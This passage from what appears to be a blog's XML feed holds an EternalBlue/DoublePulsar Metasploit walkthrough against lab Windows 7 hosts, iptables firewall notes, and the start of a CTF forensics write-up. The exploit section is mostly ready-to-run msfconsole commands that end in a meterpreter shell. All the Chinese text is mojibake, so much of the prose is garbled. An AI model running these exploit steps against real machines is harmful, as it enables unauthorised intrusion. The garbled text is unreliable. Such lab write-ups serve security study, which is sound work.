è®¾ç½®RHOSTSé¡¹ä¸º192.168.188.136</span><span class="hljs-built_in">set</span> RHOSTS 192.168.188.136<span class="hljs-comment"># è¿è¡Œè¯¥ms17_010æ£€æµ‹æ¨¡å—</span>run</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164829.png" alt=""></p><p><strong>å‘ç°ç¡®å®ç›®æ ‡æœºå™¨å­˜åœ¨MS17-010ï¼Œå¹¶æç¤ºå¯ç”¨ä¹‹å‰git cloneçš„DoublePulsaræ¨¡å—è¿›è¡Œä¾µå…¥</strong></p><h4 id="2-1-3-å¼€å§‹æ¸—é€"><a href="#2-1-3-å¼€å§‹æ¸—é€" class="headerlink" title="2.1.3 å¼€å§‹æ¸—é€"></a>2.1.3 å¼€å§‹æ¸—é€</h4><ul><li><strong>å°è¯•æ”»å‡»</strong></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨doublepulsaræ”»å‡»æ¨¡å—</span>use exploit/windows/smb/eternalblue_doublepulsar<span class="hljs-comment"># è®¾ç½®RHOSTé¡¹ä¸º192.168.188.136</span><span class="hljs-built_in">set</span> RHOST 192.168.188.136<span class="hljs-comment"># æŸ¥çœ‹æ”»å‡»æ¨¡å—çš„é…ç½®ï¼Œè¯·ç‰¹åˆ«æ³¨æ„DOUBLEPULSARPATHæ˜¯å¦ä¸ä½ git cloneä¸‹è½½çš„è·¯å¾„ä¸€è‡´</span>show options</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109170635.png" alt=""></p><pre><code class="hljs bash"><span class="hljs-comment"># è¿è¡Œæ”»å‡»æ¨¡å—</span>run</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171143.png" alt=""></p><pre><code class="hljs bash"><span class="hljs-comment"># æ¸—é€å¹¶æ²¡æœ‰æˆåŠŸï¼Œä¿®æ”¹PROCESSINJECTé¡¹ä¸ºexplorer.exe (ä¿®æ”¹ä¸ºlsass.exeä¹Ÿå¯ä»¥)</span><span class="hljs-built_in">set</span> PROCESSINJECT explorer.exe<span class="hljs-comment"># å†æ¬¡exploitï¼ŒæˆåŠŸ</span>run</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171502.png" alt=""></p><p><strong>meterpreter</strong>æ˜¯ä¸€ä¸ªä¸ºæ”»å‡»è€…æä¾›äº¤äº’æ€§shellä»¥ä¾¿äºåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»£ç çš„å‘½ä»¤è¡Œå·¥å…·ã€‚æ¸—é€æˆåŠŸçš„åç»­æ”»å‡»å¯ä»¥å‚è€ƒé˜…è¯»<a href="https://qgrain.github.io/2019/11/14/æ¸—é€-é€šè¿‡meterpreterè¿›è¡Œææƒ/">ã€æ¸—é€ã€‘meterpreterææƒ</a></p><h3 id="2-2-æ¸—é€Windows7-64-bit"><a href="#2-2-æ¸—é€Windows7-64-bit" class="headerlink" title="2.2 æ¸—é€Windows7 64-bit"></a>2.2 æ¸—é€Windows7 64-bit</h3><p>ç›¸æ¯”äºæ¸—é€Windows7 32-bitï¼Œæ¸—é€64ä½æœºå™¨è¦ç®€å•å¾—å¤šï¼Œå› ä¸º64ä½æœºå™¨çš„æ¸—é€æ˜¯msfå†…å»ºæ”¯æŒçš„ã€‚</p><p><strong><em>å‰å‡ ä¸ªæ­¥éª¤åŸºæœ¬å’Œæ¸—é€32ä½æœºå™¨ä¸€è‡´</em></strong></p><h4 id="2-2-1-ä¿¡æ¯æœé›†"><a href="#2-2-1-ä¿¡æ¯æœé›†" class="headerlink" title="2.2.1 ä¿¡æ¯æœé›†"></a>2.2.1 ä¿¡æ¯æœé›†</h4><ul><li><strong>nmapæ‰«æä¸»æœºä¿¡æ¯</strong></li><li><strong>msfconsoleé‡‡ç”¨scanneræ¨¡å—æ‰«ææ£€æµ‹ms17-010æ¼æ´</strong></li></ul><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<span class="hljs-built_in">set</span> RHOSTS 192.168.188.138 <span class="hljs-comment"># Windows 7 x64</span>show optionsrun</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114113425.png" alt=""></p><h4 id="2-2-2å¼€å§‹æ¸—é€"><a href="#2-2-2å¼€å§‹æ¸—é€" class="headerlink" title="2.2.2å¼€å§‹æ¸—é€"></a>2.2.2å¼€å§‹æ¸—é€</h4><ul><li><strong>æ–¹æ³•ä¸€ï¼šé‡‡ç”¨msfè‡ªå¸¦çš„eternalblueæ”»å‡»æ¨¡å—</strong></li></ul><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<span class="hljs-built_in">set</span> RHOST 192.168.188 138 <span class="hljs-comment"># Windows 7 x64</span>show optionsrun</code></pre><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114114152.png" alt=""></p><p>æˆåŠŸæ‹¿åˆ°ç›®æ ‡æœºå™¨çš„Shell</p><ul><li><strong>æ–¹æ³•äºŒï¼šé‡‡ç”¨githubå¼€æºæ”»å‡»æ¨¡å—DoublePulsar</strong></li></ul><p>æ­¥éª¤å’Œæ”»å‡»32ä½æœºå™¨ä¸€è‡´ï¼Œä½†æ˜¯éœ€è¦é…ç½®<a href="">wine64å’Œwine32å…±å­˜</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Bug</tag>
      
      <tag>Penetration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Iptables(1)</title>
    <link href="/2019/10/22/Iptables-1/"/>
    <url>/2019/10/22/Iptables-1/</url>
    
    <content type="html"><![CDATA[<h2 id="1-æ¦‚å¿µ"><a href="#1-æ¦‚å¿µ" class="headerlink" title="1 æ¦‚å¿µ"></a>1 æ¦‚å¿µ</h2><h3 id="1-1-é˜²ç«å¢™çš„æ¦‚å¿µ"><a href="#1-1-é˜²ç«å¢™çš„æ¦‚å¿µ" class="headerlink" title="1.1 é˜²ç«å¢™çš„æ¦‚å¿µ"></a>1.1 é˜²ç«å¢™çš„æ¦‚å¿µ</h3><ul><li>é€»è¾‘ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºä¸»æœºé˜²ç«å¢™å’Œç½‘ç»œé˜²ç«å¢™<ol><li>ä¸»æœºé˜²ç«å¢™ï¼šä¿æŠ¤å•ä¸ªä¸»æœº</li><li>ç½‘ç»œé˜²ç«å¢™ï¼šå¾€å¾€å¤„äºç½‘ç»œå…¥å£ï¼Œä¿æŠ¤å…¥å£åé¢çš„æœ¬åœ°å±€åŸŸç½‘</li></ol></li><li>ç‰©ç†ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™å’Œè½¯ä»¶é˜²ç«å¢™<ol><li>ç¡¬ä»¶é˜²ç«å¢™ï¼šåœ¨ç¡¬ä»¶çº§åˆ«å®ç°é˜²æŠ¤</li><li>è½¯ä»¶é˜²ç«å¢™ï¼šé€šè¿‡è½¯ä»¶åœ¨ç¡¬ä»¶å¹³å°ä¸Šå®ç°é˜²æŠ¤</li></ol></li></ul><h3 id="1-2-iptablesçš„æ¦‚å¿µ"><a href="#1-2-iptablesçš„æ¦‚å¿µ" class="headerlink" title="1.2 iptablesçš„æ¦‚å¿µ"></a>1.2 iptablesçš„æ¦‚å¿µ</h3><p>iptablesæ˜¯ä¸€ä¸ªlinuxæ“ä½œç³»ç»Ÿä¸­çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ç”¨æˆ·é€šè¿‡iptablesèƒ½å¤Ÿå®æ–½å¯¹çœŸæ­£é˜²ç«å¢™netfilterçš„æ“ä½œï¼Œå¦‚<strong>ç½‘ç»œåœ°å€è½¬æ¢ï¼Œæ•°æ®åŒ…å†…å®¹ä¿®æ”¹ï¼Œæ•°æ®åŒ…è¿‡æ»¤</strong>ç­‰</p><span id="more"></span><h3 id="1-3-é“¾å’Œè¡¨çš„æ¦‚å¿µ"><a href="#1-3-é“¾å’Œè¡¨çš„æ¦‚å¿µ" class="headerlink" title="1.3 é“¾å’Œè¡¨çš„æ¦‚å¿µ"></a>1.3 é“¾å’Œè¡¨çš„æ¦‚å¿µ</h3><h4 id="1-3-1-é“¾"><a href="#1-3-1-é“¾" class="headerlink" title="1.3.1 é“¾"></a>1.3.1 é“¾</h4><p>iptables é˜²ç«å¢™ä¸€å…±æœ‰äº”é“å…³å¡ï¼Œäº”é“å…³å¡åˆ†åˆ«æ˜¯<code>PREROUTING</code>ï¼Œ<code>INPUT</code>ï¼Œ<code>FORWARD</code>ï¼Œ<code>OUTPUT</code>ï¼Œ<code>POSTROUTING</code></p><p>æ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼ŒæŠ¥æ–‡ä¼šç»è¿‡ä¸åŒçš„å…³å¡ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022194236.png" alt=""></p><p>é˜²ç«å¢™çš„ä½œç”¨å°±åœ¨äºå¯¹ç»è¿‡çš„æŠ¥æ–‡åŒ¹é…â€œè§„åˆ™â€ï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„åŠ¨ä½œã€‚æ‰€ä»¥å½“æŠ¥æ–‡æµç»å…³å¡æ—¶ï¼Œä¼šåŒ¹é…å…³å¡ä¸Šçš„è§„åˆ™ã€‚ç„¶è€Œåœ¨æ¯ä¸€é“å…³å¡ä¸Šï¼Œè§„åˆ™å¯èƒ½ä¸æ­¢ä¸€æ¡ï¼Œäºæ˜¯å¤šæ¡è§„åˆ™æŒ‰ç…§ä¸€å®šçš„é€»è¾‘é¡ºåºä¸²æˆäº†ä¸€æ¡<strong>é“¾</strong>ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022194443.png" alt=""></p><h4 id="1-3-2-è¡¨"><a href="#1-3-2-è¡¨" class="headerlink" title="1.3.2 è¡¨"></a>1.3.2 è¡¨</h4><p>æˆ‘ä»¬æŠŠå…·æœ‰ç›¸åŒåŠŸèƒ½çš„è§„åˆ™çš„é›†åˆå«åš<strong>â€œè¡¨â€</strong>ï¼Œiptableså®šä¹‰äº†å››ç§è¡¨ <strong>(ä¼˜å…ˆçº§ç”±é«˜åˆ°ä½)</strong>ï¼š</p><ul><li><strong>rawè¡¨</strong>ï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„é“¾æ¥è¿½è¸ªæœºåˆ¶ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_raw</li><li><strong>mangleè¡¨</strong>ï¼šæ‹†è§£ï¼Œä¿®æ”¹ï¼Œé‡æ–°å°è£…æŠ¥æ–‡ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_mangle</li><li><p><strong>natè¡¨</strong>ï¼šç½‘ç»œåœ°å€è½¬æ¢ï¼ˆnetwork address translationï¼‰ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_nat</p></li><li><p><strong>filterè¡¨</strong>ï¼šè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼›å†…æ ¸æ¨¡å—ï¼šiptables_filter</p></li></ul><h4 id="1-3-3-è¡¨ä¸é“¾çš„å…³ç³»"><a href="#1-3-3-è¡¨ä¸é“¾çš„å…³ç³»" class="headerlink" title="1.3.3 è¡¨ä¸é“¾çš„å…³ç³»"></a>1.3.3 è¡¨ä¸é“¾çš„å…³ç³»</h4><p>ä¸åŒçš„é“¾ä¸Šçš„è§„åˆ™ä¼šæ ¹æ®åŠŸèƒ½ä¸åŒè€Œå­˜æ”¾åœ¨ä¸åŒçš„è¡¨ä¸­ï¼Œä¸åŒçš„é“¾ä¸Šèƒ½å­˜æ”¾çš„è¡¨ä¹Ÿæœ‰æ‰€ä¸åŒã€‚ä»¥ä¸‹æ˜¯é“¾ä¸è¡¨çš„å…³ç³»ï¼š</p><ul><li><strong>PREROUTING</strong>ï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨</li><li><strong>INPUT</strong>ï¼šmangleè¡¨ï¼Œfilterè¡¨</li><li><strong>FORWARD</strong>ï¼šmangleè¡¨ï¼Œfilterè¡¨</li><li><strong>OUTPUT</strong>ï¼šrawè¡¨ï¼Œmangleè¡¨ï¼Œnatè¡¨ï¼Œfilterè¡¨</li><li><strong>POSTROUTING</strong>ï¼šmangleè¡¨ï¼Œnatè¡¨</li></ul><p><strong>ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨å®é™…æ“ä½œiptablesçš„æ—¶å€™ï¼Œå¾€å¾€æ˜¯é€šè¿‡â€œè¡¨â€ä½œä¸ºæ“ä½œå…¥å£ï¼Œå¯¹è§„åˆ™è¿›è¡Œå®šä¹‰çš„ã€‚</strong>ä»¥ä¸‹æ˜¯è¡¨ä¸é“¾çš„å…³ç³»ï¼š</p><ul><li><strong>raw</strong>ï¼šPREROUTINGï¼ŒOUTPUT</li><li><strong>mangle</strong>ï¼šPREROUTINGï¼ŒINPUTï¼ŒFORWARDï¼ŒOUTPUTï¼ŒPOSTROUTING</li><li><strong>nat</strong>ï¼šPREROUTINGï¼ŒOUTPUTï¼ŒPOSTROUTING</li><li><strong>filter</strong>ï¼šINPUTï¼ŒFORWARDï¼ŒOUTPUT</li></ul><p><strong>æ•°æ®åŒ…æµç»ä¸»æœºçš„è¯¦ç»†å›¾è§£</strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022194815.png" alt=""></p><h2 id="2-iptablesçš„è§„åˆ™ç®¡ç†"><a href="#2-iptablesçš„è§„åˆ™ç®¡ç†" class="headerlink" title="2 iptablesçš„è§„åˆ™ç®¡ç†"></a>2 iptablesçš„è§„åˆ™ç®¡ç†</h2><h3 id="2-1-åŸºæœ¬çš„è§„åˆ™æ“ä½œ"><a href="#2-1-åŸºæœ¬çš„è§„åˆ™æ“ä½œ" class="headerlink" title="2.1 åŸºæœ¬çš„è§„åˆ™æ“ä½œ"></a>2.1 åŸºæœ¬çš„è§„åˆ™æ“ä½œ</h3><ul><li><p><strong>æŸ¥çœ‹è§„åˆ™</strong>ï¼š</p><ul><li>-Lï¼šlistï¼Œæ˜¾ç¤ºæŒ‡å®šçš„å‚æ•°ï¼Œåœ¨åé¢è·Ÿä¸Šé“¾çš„åå­—å¯ä»¥æŒ‡å®šæŸ¥çœ‹çš„è§„åˆ™é“¾</li><li>-Cï¼šcheckï¼ŒæŸ¥æ‰¾å¹¶æ˜¾ç¤ºæŒ‡å®šçš„å‚æ•°</li><li>-tï¼štableï¼ŒæŒ‡å®šè¦åŒ¹é…çš„è¡¨ï¼Œï¼ˆå½“æ²¡æœ‰æŒ‡å®šæ—¶ï¼Œé»˜è®¤ä¸ºfilterè¡¨ï¼‰</li><li>-vï¼šverboseï¼Œè¯¦ç»†ä¿¡æ¯ï¼ˆå¤šå‡ºpktsï¼Œbytesï¼Œtargetï¼Œprotï¼Œoptï¼Œinï¼Œoutç­‰ä¿¡æ¯ï¼‰</li><li>-nï¼šä¸å¯¹ipè¿›è¡ŒåŸŸååè§£</li><li>â€”line-numberï¼šæ˜¾ç¤ºè§„åˆ™çš„åºå·</li><li>-xï¼šæ˜¾ç¤ºç²¾ç¡®çš„packetså’Œbytesæ•°ç›®</li></ul><p><strong>æœ€ç»ˆå‘½ä»¤ä¸º<code>iptables</code>ä¸ä¸Šè¿°<code>option</code>çš„ç»„åˆ</strong></p></li><li><p><strong>å¢åŠ è§„åˆ™</strong>ï¼š</p><ul><li><code>-t</code> + <code>æŒ‡å®šçš„è¡¨</code> æŒ‡å®šè¦æ“ä½œçš„è¡¨</li><li><code>-I</code> + <code>æŒ‡å®šçš„è§„åˆ™é“¾</code>  insertï¼Œæ’å…¥æŒ‡å®šçš„è¡¨çš„è§„åˆ™é“¾é¦–</li><li><code>-A</code> + <code>æŒ‡å®šçš„è§„åˆ™é“¾</code>  appendï¼Œè¿½åŠ åˆ°æŒ‡å®šçš„è¡¨çš„è§„åˆ™é“¾å°¾</li><li><code>-s</code>ï¼šæºåœ°å€ï¼ˆdefault ä¸º 0.0.0.0/0ï¼Œä¹Ÿå³allï¼‰</li><li><code>-d</code>ï¼šç›®çš„åœ°å€ï¼ˆdefault ä¸º0.0.0.0/0ï¼Œä¹Ÿå³allï¼‰</li><li><code>-j</code>ï¼štagetå­—æ®µï¼Œå³ACCEPTã€REJECTã€DROPç­‰åŠ¨ä½œ</li></ul></li><li><p><strong>åˆ é™¤è§„åˆ™</strong>ï¼š</p><ul><li>æ ¹æ®è§„åˆ™çš„ç¼–å·åˆ é™¤ï¼š<code>iptables -t TABLE -D CHAIN seq</code> å…¶ä¸­TABLEæ˜¯æŒ‡å®šçš„è¡¨ï¼ŒCHAINæ˜¯æŒ‡å®šçš„é“¾ï¼Œseqæ˜¯è¦åˆ é™¤çš„è§„åˆ™çš„åºå·ã€‚</li><li>æ ¹æ®å…·ä½“çš„åŒ¹é…æ¡ä»¶ä¸åŠ¨ä½œåˆ é™¤è§„åˆ™ï¼šå¦‚ <code>iptables -D INPUT -s 192.168.1.123 -j ACCEPT</code></li><li>åˆ é™¤æŸè¡¨çš„æŸæ¡é“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼š<code>iptables -t è¡¨å -F é“¾å</code>ï¼Œ<strong>F</strong> for flushï¼ˆ<strong>æ…é‡ï¼</strong>ï¼‰</li><li>ä¿®æ”¹è§„åˆ™ï¼š<code>-R é“¾å åºå· æ–°çš„åŒ¹é…æ¡ä»¶</code>ï¼Œä½†æ›´å»ºè®®åˆ é™¤åŸè§„åˆ™å†æ–°å»ºä¸€æ¡è§„åˆ™ã€‚</li></ul></li><li><p><strong>ä¿å­˜è§„åˆ™</strong>ï¼š</p><ul><li>centosä¸­ï¼Œä½¿ç”¨service iptables save å³å¯ã€‚è§„åˆ™ä¼šé»˜è®¤ä¿å­˜åœ¨ /etc/sysconfig/iptablesæ–‡ä»¶ä¸­</li><li>é€šç”¨æ–¹æ³•ï¼šå°†iptables-save çš„æµé‡å®šå‘åˆ°/etc/sysconfig/iptables æ–‡ä»¶</li><li>é‡è½½è§„åˆ™ï¼šiptables-restore &lt; /etc/sysconfig/iptables (é‡è½½ä¼šè¦†ç›–ç°æœ‰çš„è§„åˆ™)</li></ul></li></ul><h3 id="2-2-è¿›é˜¶è§„åˆ™æ“ä½œâ€”é»‘ç™½åå•"><a href="#2-2-è¿›é˜¶è§„åˆ™æ“ä½œâ€”é»‘ç™½åå•" class="headerlink" title="2.2 è¿›é˜¶è§„åˆ™æ“ä½œâ€”é»‘ç™½åå•"></a>2.2 è¿›é˜¶è§„åˆ™æ“ä½œâ€”é»‘ç™½åå•</h3><h4 id="2-2-1-é»‘åå•"><a href="#2-2-1-é»‘åå•" class="headerlink" title="2.2.1 é»‘åå•"></a>2.2.1 é»‘åå•</h4><ul><li><p><strong>æ¦‚å¿µ</strong>ï¼šé™¤äº†ä¸åå•ä¸ŠåŒ¹é…çš„æŠ¥æ–‡ç¦æ­¢é€šè¿‡ä»¥å¤–ï¼Œæ‰€æœ‰æŠ¥æ–‡çš†æ”¾è¡Œ</p></li><li><p><strong>å®ç°æ–¹æ³•</strong>ï¼š<br>æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°iptablesçš„æ¯ä¸€æ¡è§„åˆ™é“¾åé¢éƒ½æ˜¾ç¤ºè¿™æ ·çš„å†…å®¹ï¼š<br><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191022195523.png" alt=""></p><p><code>policy ç­–ç•¥</code> è¡¨ç¤ºè¯¥é“¾å¯¹äºæŠ¥æ–‡çš„<strong>é»˜è®¤ç­–ç•¥</strong>ã€‚æ‰€ä»¥å½“é»˜è®¤ç­–ç•¥ä¸º<strong>ACCEPT</strong>æ—¶ï¼Œé“¾ä¸­çš„è§„åˆ™åº”è¯¥ä¸º<strong>REJECTæˆ–DROP</strong>ï¼Œæ­¤æ—¶ä¹‹åªæœ‰åŒ¹é…åˆ°çš„æŠ¥æ–‡ä¼šè¢«æ‹’ç»æˆ–ä¸¢æ‰ï¼Œå…¶ä½™çš„æŠ¥æ–‡çš†è¢«æ”¾è¡Œï¼Œä»è€Œå®ç°é»‘åå•ã€‚</p></li><li><p><strong>å‘½ä»¤</strong>ï¼š<code>iptables -P é“¾å ACCEPT</code></p></li></ul><h4 id="2-2-2-ç™½åå•"><a href="#2-2-2-ç™½åå•" class="headerlink" title="2.2.2 ç™½åå•"></a>2.2.2 ç™½åå•</h4><ul><li><strong>æ¦‚å¿µ</strong>ï¼šé™¤äº†ä¸åå•ä¸ŠåŒ¹é…çš„æŠ¥æ–‡ä¼šæ”¾è¡Œï¼Œæ‰€æœ‰æŠ¥æ–‡çš†è¢«ç¦æ­¢é€šè¿‡</li><li><strong>å®ç°æ–¹æ³•</strong>ï¼šå°†é»˜è®¤ç­–ç•¥è®¾ç½®ä¸º<strong>REJECTæˆ–DROP</strong>ï¼Œé“¾ä¸­çš„è§„åˆ™è®¾ç½®ä¸º<strong>ACCEPT</strong></li><li><strong>å‘½ä»¤</strong>ï¼š<code>iptables -P é“¾å REJECT or iptables -P é“¾å DROP</code></li></ul><h4 id="2-2-3-ç™½åå•çš„æ”¹è¿›"><a href="#2-2-3-ç™½åå•çš„æ”¹è¿›" class="headerlink" title="2.2.3 ç™½åå•çš„æ”¹è¿›"></a>2.2.3 ç™½åå•çš„æ”¹è¿›</h4><ul><li><p><strong>æ™®é€šç™½åå•çš„å®‰å…¨éšæ‚£</strong>ï¼šå½“æˆ‘ä»¬å°†é»˜è®¤ç­–ç•¥è®¾ç½®ä¸ºæ‹’ç»æ—¶ï¼Œå¦‚æœæˆ‘ä»¬ <code>iptables -F</code> æ¸…ç©ºäº†è§„åˆ™é“¾ï¼Œé‚£ä¹ˆæ‰€æœ‰æŠ¥æ–‡éƒ½ä¼šè¢«æ‹’ç»ï¼Œå¦‚æœç®¡ç†å‘˜æ­£åœ¨è¿œç¨‹sshæ“ä½œï¼Œæ­¤æ—¶sshè¿æ¥åˆ™ä¼šç›´æ¥æ–­å¼€ï¼Œä¸”ç›®æ ‡æœºå™¨ä¼šä¸å¤–éƒ¨é€šä¿¡é˜»éš”</p></li><li><p><strong>æ”¹è¿›</strong>ï¼šå°†é»˜è®¤ç­–ç•¥çš„æ‹’ç»æ”¹ä¸ºæ¥å—ï¼Œç„¶åå°†<strong>â€œæ‹’ç»æ‰€æœ‰çš„æŠ¥æ–‡â€œ</strong>æ”¾åœ¨è§„åˆ™é“¾çš„æœ«å°¾ã€‚æ ¹æ®è§„åˆ™é“¾çš„é¡ºåºåŒ¹é…å¯çŸ¥ï¼Œç¬¦åˆåŒ¹é…è§„åˆ™çš„æŠ¥æ–‡æ”¾è¡Œï¼Œå¦åˆ™ä¸€å¾‹ç¦æ­¢é€šè¿‡</p></li><li><p><strong>å‘½ä»¤</strong>ï¼š</p><pre><code class="hljs mipsasm">iptables -P é“¾å ACCEPT     <span class="hljs-comment">#æ›´æ”¹é»˜è®¤ç­–ç•¥</span>iptabels -A é“¾å -<span class="hljs-keyword">j </span>REJECT  <span class="hljs-comment">#åœ¨é“¾å°¾è¿½åŠ å…¨éƒ¨æ‹’ç»çš„è§„åˆ™</span></code></pre></li></ul><p><strong>å‚è€ƒæ–‡æ¡£ï¼š</strong><a href="https://www.zsythink.net/archives/tag/iptables/">iptablesé˜²ç«å¢™|æœ±åŒå°åšå®¢</a></p>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>iptables</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€CTFä¾‹é¢˜åˆ†æã€‘MISCæ‚é¡¹(ä¸€)</title>
    <link href="/2019/10/15/CTF%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90-MISC%E6%9D%82%E9%A1%B9-%E4%B8%80/"/>
    <url>/2019/10/15/CTF%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90-MISC%E6%9D%82%E9%A1%B9-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>CTFä¾‹é¢˜åˆ†æç³»åˆ—ï¼ŒMISCæ‚é¡¹æ–¹å‘(ä¸€)ã€‚æœ¬ç¯‡æ–‡ç« ä¸»è¦è®²è§£ä¸‰é“ä»æ˜“åˆ°éš¾çš„MISCæ–¹å‘çš„é¢˜ç›®ã€‚ç›®çš„åœ¨äºè®©å¤§å®¶èƒ½å¤Ÿäº†è§£CTFçš„MISCç±»å‹çš„å†°å±±ä¸€è§’ã€‚QAQ</p><h1 id="1-ä¸€é“ç»ƒæ‰‹çš„é¢˜ç›®"><a href="#1-ä¸€é“ç»ƒæ‰‹çš„é¢˜ç›®" class="headerlink" title="1 ä¸€é“ç»ƒæ‰‹çš„é¢˜ç›® "></a>1 ä¸€é“ç»ƒæ‰‹çš„é¢˜ç›® <img src = "https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width = 30></h1><blockquote><p>ä»Šå¤©æ˜¯èœå°ç‹—çš„ç”Ÿæ—¥ï¼Œä»–æ”¶åˆ°äº†ä¸€ä¸ªLinuxç³»ç»Ÿå…‰ç›˜ã€‚</p><ul><li>è¦æ±‚æ‹¿åˆ°flagï¼Œæäº¤æ ¼å¼ä¸º<code>flag&#123;The_String_of_Flag&#125;</code></li><li><a href="https://adworld.xctf.org.cn/media/task/attachments/630a886233764ec2a63f305f318c8baa">é™„ä»¶ä¸‹è½½åœ°å€</a></li></ul></blockquote><span id="more"></span><p>ä¸‹è½½é™„ä»¶ï¼Œå‘ç°è¯¥æ–‡ä»¶åå¾ˆé•¿ï¼Œé¦–å…ˆæ€€ç–‘æ˜¯å¦flagè—åœ¨æ–‡ä»¶åé‡Œ<strong><em>ï¼ˆåè§‰æ­¤æƒ³æ³•æå…¶ç¨šå«©ï¼‰</em></strong></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015171511.png" alt=""></p><p><strong>å‘ç°æ— æ³•è§£ç ï¼Œä¾¿è€è€å®å®æŒ‰ç…§é¢˜ç›®æ‰€æœŸæœ›çš„æ–¹å‘è§£é¢˜</strong></p><ol><li>æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ª<code>Linux rev 1.0 ext3 filesystem data</code> ç±»å‹çš„æ–‡ä»¶ã€‚</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015164116.png" alt=""></p><ol><li>ï¼ˆWSLæ— æ³•æ­£å¸¸ä½¿ç”¨mountï¼‰å°è¯•æŒ‚è½½è¯¥æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯å¾—åˆ°<code>is not a block device</code> é”™è¯¯æç¤º</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015172410.png" alt=""></p><ol><li>ä½¿ç”¨<code>mount -o loop</code>  æŒ‚åœ¨ç¯å›æ–‡ä»¶ç³»ç»Ÿåˆ°<code>./mnt/</code> ç›®å½•<img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015172741.png" alt=""></li><li>æŸ¥æ‰¾flagç›¸å…³çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªåä¸º<code>flag.txt</code> çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶å†…å®¹ã€‚</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015184534.png" alt=""></p><ol><li>å­—ç¬¦ä¸²å„ä¸ªå­—ç¬¦å‡ä¸ºASCIIç å¯æ‰“å°å­—ç¬¦ï¼Œä¸”å­—ç¬¦ä¸²ä»¥ <code>=</code> ç»“å°¾ï¼Œæ€€ç–‘æ˜¯Base64ç¼–ç ï¼Œäºæ˜¯è§£ç å¾—åˆ°æœ€ç»ˆflag</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015184920.png" alt=""></p><p><strong>æ³¨ï¼šå…³äºä¸Šé¢æåˆ°Base64ç¼–ç çš„çŒœæµ‹ï¼Œå¯ä»¥å‚è€ƒæˆ‘è¿™ä¸€ç¯‡ç¬”è®° <a href="[https://qgrain.github.io/2019/10/15/Base%E7%BC%96%E7%A0%81/](https://qgrain.github.io/2019/10/15/Baseç¼–ç /">Baseç¼–ç å®¶æ—</a>)</strong></p><h1 id="2-ä¸€é“æœ‰ç‚¹éš¾åº¦çš„é¢˜ç›®"><a href="#2-ä¸€é“æœ‰ç‚¹éš¾åº¦çš„é¢˜ç›®" class="headerlink" title="2 ä¸€é“æœ‰ç‚¹éš¾åº¦çš„é¢˜ç›® "></a>2 ä¸€é“æœ‰ç‚¹éš¾åº¦çš„é¢˜ç›® <img src = "https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width = 30><img src = "https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width = 30></h1><blockquote><p>ä»Šå¤©èœå°ç‹—ä¸ºäº†æ‰“è´¥èœå°çŒ«ï¼Œå­¦äº†ä¸€å¥—å¦‚æ¥åä¸‰æŒ</p><ul><li>è¦æ±‚æ‹¿åˆ°flagï¼Œæäº¤æ ¼å¼ä¸º`flag{The_String_of_Flag}</li><li><a 